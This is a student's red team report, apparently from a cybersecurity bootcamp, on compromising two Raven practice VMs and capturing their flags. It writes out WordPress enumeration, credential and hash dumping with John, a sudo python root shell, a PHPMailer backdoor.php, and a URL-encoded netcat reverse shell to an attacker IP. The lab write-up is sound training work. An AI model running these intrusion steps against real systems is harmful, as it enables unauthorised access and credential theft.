# Red Team: Summary of Operations

## Table of Contents

### Target 1  
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Target 2  
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Target 1  

### Exposed Services

Netdiscover results identify the IP addresses of Targets on the network:

```bash
`$ netdiscover -r 192.168.1.255/16`  
```

![Netdiscover IP Address](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/netdiscover_-r_192_168_1_255_16.PNG)  

Nmap scan results for **`Target 1`** reveal the below services and OS details:

Name of VM: **`Target 1`**  
Operating System: **`Linux`**  
Purpose: **`Defensive Blue Team`**  
IP Address: **`192.168.1.110`**  

```bash
$ nmap -sV 192.168.1.110
```
![NMAP of IP Address](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/nmap_-sV_192_168_1_110.PNG)  

This scan identifies the services below as potential points of entry:
- **`Target 1`**  
  - Port 22/tcp open ssh (service) OpenSSH 6.7p1 Debian 5+deb8u4  
  - Port 80/tcp open http (service) Apache httpd 2.4.10 ((Debian))  
  - Port 111/tcp open rpcbind (service) 2-4 (RPC #100000)  
  - Port 139/tcp open netbios-ssn (services) Samba smbd 3.X - 4.X  
  - Port 445/tcp open netbios-ssn (services) Samba smbd 3.X - 4.X   

The following vulnerabilities were identified on **`Target 1`**:
- **`Target 1`**   
  - [CVE-2021-28041 open SSH](https://nvd.nist.gov/vuln/detail/CVE-2021-28041)  
  - [CVE-2017-15710 Apache https 2.4.10](https://nvd.nist.gov/vuln/detail/CVE-2017-15710)
  - [CVE-2017-8779 exploit on open rpcbind port could lead to remote DoS](https://nvd.nist.gov/vuln/detail/CVE-2017-8779)  
  - [CVE-2017-7494 Samba NetBIOS](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)  

### Critical Vulnerabilities 

The following vulnerabilities were identified on **`Target 1`**:  

- Network Mapping and User Enumeration (WordPress site)
  - Nmap was used to discover open ports.  
    - Able to discover open ports and tailor their attacks accordingly.  
- Weak User Password  
  - A user had a weak password and the attackers were able to discover it by guessing.  
    - Able to correctly guess a user's password and SSH into the web server.  
- Unsalted User Password Hash (WordPress database)  
  - Wpscan was utilized by attackers in order to gain username information.  
    - The username info was used by the attackers to help gain access to the web server.  
- MySQL Database Access  
  - The attackers were able to discover a file containing login information for the MySQL database.  
    - Able to use the login information to gain access to the MySQL database.  
- MySQL Data Exfiltration  
  - By browsing through the various tables in the MySQL database the attackers were able to discover password hashes of all the users.  
    - The attackers were able to exfiltrate the password hashes and crack them with John the Ripper.  
- Misconfiguration of User Privileges/Privilege Escalation  
  - The attackers noticed that Steven had sudo privileges for python.  
    - Able to utilize Steven’s python privileges in order to escalate to root.  

### Exploitation

The Red Team was able to penetrate **`Target 1`** and retrieve the following confidential data:  

- Enumerated WordPress site Users with WPScan to obtain username michael, used SSH to get user shell.  
- Command used: wpscan --url http://192.168.1.110/wordpress -eu  

```bash
root@Kali:~# wpscan --url http://192.168.1.110/wordpress -eu
```  

![WordPress Scan](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/WordPress_scan_of_Target_1-1.PNG)  
![WordPress Scan - 2](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/WordPress_scan_of_Target_1-2.PNG)  
![WordPress Scan - 3](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/WordPress_scan_of_Target_1-1_2-users.png)  

**`Visited the IP address of the target 192.168.1.110 over HTTP port 80.`**  

![WordPress Website](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/Port_80_open_192_168_1_110_web.PNG)  

- flag1.txt: `flag1{b9bbcb33e11b80be759c4e844862482d}`  
![Flag1](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/flag1.PNG)  
  - Exploit Used  
  - ssh into **`Michael’s`** account and look in the/var/www files
  - **Command:** `ssh michael@192.168.1.110`  
  - The username and password **`michael`** were identical, allowing for the ssh connection.  
  ![Michael's Password](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/Login_attempt_to_michael_account.PNG)  
  - **Command:** `cd /var/www`  
  - **Command:** `ls`  
  - **Command:** `grep -RE flag html`  
  - **`flag1`** was part of the long printout.
  ![Flag1 Printout](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/Capture_flag1.PNG)  
  
- flag2.txt: `flag2{fc3fd58dcdad9ab23faca6e9a36e581c}`  
![Flag2](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/flag2.PNG)  
  - Exploit Used  
    - **Command:** `ssh into Michael’s account and look in the /var/www files`  
    - **Command:** `cd /var/www`  
    - **Command:** `ls -lah`  
    - **Command:** `cat flag2.txt`  
![Captured Flag2](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/Capture_flag2.PNG)  

- flag3.txt: `flag3{afc01ab56b50591e7dccf93122770cd2}`  
![Flag3](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/flag3.PNG)  
  - Exploit Used  
    - Continued using michael shell to find the `MySQL database` password, logged into `MySQL database`, and found `Flag 3` in wp_posts table.  
    - **Command:** `cd /var/www/html/wordpress/`  
    - **Command:** `cat /var/www/html/wordpress/wp-config.php`  
![WP-CONFIG readout](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/cat_wp-config-php-1.PNG)  
![WP-CONFIG readout-2](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/cat_wp-config-php-2.PNG)  
![WP-CONFIG readout-3](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/cat_wp-config-php-3.PNG)  

- Used the credentials to log into MySQL and dump WordPress user password hashes.  
  - **DB_NAME:** `wordpress`  
  - **DB_USER:** `root`  
  - **DB_PASSWORD:** `R@v3nSecurity`  
  - **Command:** `mysql -u root -p`

```bash
$ mysql -u root -p  
```  

- Searched MySQL database for `Flag 3` and `WordPress` user password hashes.  
  - **`Flag 3`** found in `wp_posts`.  
  - **Password hashes** found in `wp_users`.  
  - **Command:** `show databases;`  
  - **Command:** `use wordpress;`  
  - **Command:** `show tables;`  
  - **Command:** `select * from wp_posts;`  
![Login to MySQL database](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/login_to_mysql.PNG)  

  - `Flag 3` and `Flag 4` were part of the `wp_post`.  
![Flag 3 and 4 From wp_post](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/flag3_%26_flag4.PNG)  
- Screenshot of WordPress user password hashes: 
  - **Command:** `select * from wp_users;`  

| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
|---:|------------|:----------------------------------:|---------------|-------------------|----------|:-------------------:|---------------------|------------:|----------------|
| 1  | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     | 0           | michael        |
| 2  | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     | 0           | Steven Seagull |  

![Password Hashes from wp_users](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/hashes_for_users_michael_and_steven.PNG)  

- flag4.txt: `flag4{715dea6c055b9fe3337544932f2941ce}`
![Flag4](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/flag4_1.PNG)  
  - Exploit Used
    - Used `john` to crack the password hash obtained from MySQL database, secured a new user shell as Steven, escalated to root.  
    - Cracking the password hash with `john`.  
    - Copied password hash from `MySQL` into _`~/root/wp_hashes.txt`_ and cracked with `john` to discover `Steven’s` password is **`pink84`**.  
      - **Command:** `john wp_hashes.txt`
![John Hashes Password](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/john_wp_hashes_txt.PNG)  
      - **Command:** `john --show wp_hashes.txt`  
![Steven's Password](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/steven_password_cracked.PNG)  
  - Secure a user shell as the user whose password you cracked.
    - **Command:** `ssh steven@192.168.1.110`  
    - **Password:* `pink84`  
  - Escalating to root:  
    - **Command:** `sudo -l`  
![Sudo Steven's Account](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/steven_sudo_previlages.PNG)  
    - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`  
```bash    
$ sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
```  
  - Searched for the root directory for `Flag 4`.  
    - **Command:** `cd /root/`  
    - **Command:** `ls`  
    - **Command:** `cat flag4.txt`
  - Screenshot of `Flag 4`:  
![Flag 4](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/flag4-1.png)  

Target 2 Exposed Services Name of VM: Target 2 Operating System: Linux Purpose: Offensive Red Team IP Address: 192.168.1.115 root@Kali:~# nmap -sP 192.168.1.0/24 Nmap scan results for Target 2 reveal the below services and OS details: root@Kali:~# nmap -sV 192.168.1.115
Page 17 of 29 Ketan Vithal Patel
This scan identifies the services below as potential points of entry: ● Target 2
○ Port 22/tcp open ssh (service) OpenSSH 6.7p1 Debian 5+deb8u4
○ Port 80/tcp open http (service) Apache httpd 2.4.10 ((Debian))
○ Port 111/tcp open rpcbind (service) 2-4 (RPC #100000)
○ Port 139/tcp open netbios-ssn (services) Samba smbd 3.X - 4.X
○ Port 445/tcp open netbios-ssn (services) Samba smbd 3.X - 4.X The following vulnerabilities were identified on Target 2:
○ CVE-2016-10033 (Remote Code Execution Vulnerability in PHPMailer)
○ CVE-2021-28041 open SSH
○ CVE-2017-15710 Apache https 2.4.10 ○ CVE-2017-8779 exploit on open rpcbind port could lead to remote DoS
○ CVE-2017-7494 Samba NetBIOS Critical Vulnerabilities The following vulnerabilities were identified on Target 2: ● CVE-2016-10033 (Remote Code Execution Vulnerability in PHPMailer 5.2.16)
○ Get access to the web services and search for a lot of confidential information.
■ Exploiting PHPMail with back connection (reverse shell) from the target ● Network Mapping and User Enumeration (WordPress site) ○ Nmap was used to discover open ports. ■ Able to discover open ports and tailor their attacks accordingly. ● Weak Root Password ○ The root login had a weak password and the attackers were able to discover it by guessing. ■ Able to correctly guess a root's password. ● Misconfiguration of User Privileges/Privilege Escalation ○ The attackers noticed that the root user has sudo privileges for python. ■ Able to utilize root’s python privileges in order to escalate for privilege to other folders.
Ketan Vithal Patel Page 18 of 29
Exploitation The Red Team was able to penetrate Target 2 and retrieve the following confidential data: Flag 1
● flag1.txt: flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
○ Exploit Used:
■ Enumerated WordPress site with Nikto and Gobuster to create a list of exposed URLs from the Target HTTP server and gather version information.
■ Command: nikto -C all -h 192.168.1.115 root@Kali:~# nikto -C all -h 192.168.1.115
■ Determined the website is running on Apache/2.4.10 (Debian).
■ Performed a more in-depth enumeration with Gobuster.
■ Command: sudo apt-get update
■ Command: sudo apt-get install gobuster
■ Command: gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115
Page 19 of 29 Ketan Vithal Patel
root@Kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115
Ketan Vithal Patel Page 20 of 29
■ The PATH file in the Vendor directory was modified recently compared to other files. Subsequent investigation of this file revealed Flag 1.
■ Screenshot of Flag 1:
■ Investigated the VERSION file and discovered the PHPMailer version being used is 5.2.16.
Page 21 of 29 Ketan Vithal Patel
■ Investigated the SECURITY.md file and identified CVE-2016-10033 (Remote Code Execution Vulnerability) as a potential exploit for PHPMailer version 5.2.16.
Flag 2
● flag2.txt: flag2{6a8ed560f0b5358ecf844108048eb337}
○ Exploit Used:
■ Used Searchsploit to find vulnerability associated with PHPMailer 5.2.16, exploited with bash script to open backdoor on target, and opened reverse shell on target with Ncat listener.
■ Command: nc -lnvp 4444
■ Command: nc 192.168.1.90 4444 -e /bin/bash
■ URL: 192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash
■ Used Searchsploit to find any known vulnerabilities associated with PHPMailer.
■ Command: searchsploit phpmailer
Ketan Vithal Patel Page 22 of 29
root@Kali:~# searchsploit phpmailer
○ Confirmed exploit 40970.php matched with CVE-2016-10033 and PHPMailer version 5.2.16.
■ Command: searchsploit -x /usr/share/exploitdb/exploits/php/webapps/40970.php
root@Kali:~# searchsploit -x /usr/share/exploitdb/exploits/php/webapps/40970.php
Page 23 of 29 Ketan Vithal Patel
Ketan Vithal Patel Page 24 of 29
○ Used the script exploit.sh to exploit the vulnerability by opening an Ncat connection to attacking Kali VM.
■ The IP address of Target 2 is 192.168.1.115.
■ The IP address of the attacking Kali machine is 192.168.1.90.
○ Ran the script and uploaded the file backdoor.php to the target server to allow command injection attacks to be executed.
■ Command: bash exploit.sh
root@Kali:~# bash exploit.sh
Page 25 of 29 Ketan Vithal Patel
○ Navigating to 192.168.1.115/backdoor.php?cmd=<CMD> now allows bash commands to be executed on Target 2.
■ URL: 192.168.1.115/backdoor.php?cmd=cat%20/etc/passwd
○ Used backdoor to open a reverse shell session on the target with Ncat listener and command injection in browser.
■ Started Ncat listener on attacking Kali VM.
■ Command: nc -lnvp 4444
root@Kali:~# nc -lnvp 4444
○ In the browser, use the backdoor to run commands and open a reverse shell session on target.
■ Command: nc 192.168.1.90 4444 -e /bin/bash
■ URL: 192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash
Ketan Vithal Patel Page 26 of 29
○ This allowed the Ncat listener to connect to the target.
■ Interactive user shell opened on target using the following command:
■ Command: python -c ‘import pty;pty.spawn(“/bin/bash”)’
root@Kali:~# python -c ‘import pty;pty.spawn(“/bin/bash”)’
○ After gaining shell sessions, Flag 2 was discovered in /var/www.
■ Command: cd ..
■ Command: cat flag2.txt
○ Screenshot of Flag 2:
Flag 3
● flag3.png: flag3{a0f568aa9de277887f37730d71520d9b}
○ Exploit Used:
■ Used shell access on target to search WordPress uploads directory for Flag 3, discovered path location, and navigated to web browser to view flag3.png.
■ Command: find /var/www -type f -iname 'flag*'
■ Path: /var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
■ URL: 192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png
Page 27 of 29 Ketan Vithal Patel
■ Used the find command to find flags in the WordPress uploads directory.
root@Kali:~# find /var/www -type f -iname 'flag*'
■ Discovered Flag 3 location path is /var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
■ In web browser navigated to 192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png
■ Screenshot of Flag 3:
Ketan Vithal Patel Page 28 of 29
Flag 4
● flag4.txt: flag4{df2bc5e951d91581467bb9a2a8ff4425}
___ ___ ___
| _ \__ ___ _____ _ _ |_ _|_ _|
| / _` \ V / -_) ' \ | | | |
|_|_\__,_|\_/\___|_||_|___|___|
flag4{df2bc5e951d91581467bb9a2a8ff4425}
CONGRATULATIONS on successfully rooting RavenII
I hope you enjoyed this second interation of the Raven VM
Hit me up on Twitter and let me know what you thought:
@mccannwj / wjmccann.github.io
○ Exploit Used:
■ Escalated to root by using su root command and manual brute force to find password, changed to root directory, and found Flag 4 in text file.
■ Command: su root
■ Password: toor
■ Command: cd /root
■ Command: cat flag4.txt
Page 29 of 29 Ketan Vithal Patel
■ Screenshot of Flag 4:

---
  
## :sunglasses: `Ketan Vithal Patel` :sunglasses:  

### `Monday, September 13, 2021 -- UofT Cybersecurity - Boot Camp`
#### :rose::rose:`Jai Shri Swaminarayan`:rose::rose:
```
હરે કૃષ્ણ હરે કૃષ્ણ, કૃષ્ણ કૃષ્ણ હરે હરે |  Hare Krishna Hare Krishna, Krishna Krishna Hare Hare |
હરે રામ હરે રામ, રામ રામ હરે હરે ||   Hare Ram Hare Ram, Ram Ram Hare Hare ||
```
---  
